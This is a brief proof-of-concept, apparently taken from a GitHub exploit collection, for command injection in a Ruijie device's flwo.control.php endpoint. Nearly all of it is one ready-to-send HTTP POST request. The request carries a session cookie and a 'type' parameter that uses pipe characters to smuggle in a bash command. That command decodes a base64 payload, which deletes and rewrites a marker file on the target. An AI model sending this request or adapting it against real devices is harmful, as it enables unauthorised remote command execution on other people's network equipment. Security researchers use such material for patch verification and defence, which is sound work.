# ruijie_flwo.control.php_rce

from: https://github.com/wy876/POC/blob/83ffd34e35da0bb8b1f8325dd4810e31b0d8a01a/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9Cflwo.control.php%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md

2024.5.20 

```
POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1
Host: localhost:4430
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 11
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: user=21232f297a57a5a743894a0e4a801fc3; LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gateway; supportMoreLan=no; RUIJIEID=h250c4c46emk9dv2mjmbk5rlc0; user=21232f297a57a5a743894a0e4a801fc3; isRedirect=true; authenType=local; accountType=write; showPatchDialog=true; module=macc; threeModule=seltab
Origin: https:// localhost:4430
Referer: https:// localhost:4430/rac_pi/surfilter_selservice.htm
Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: x
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
```
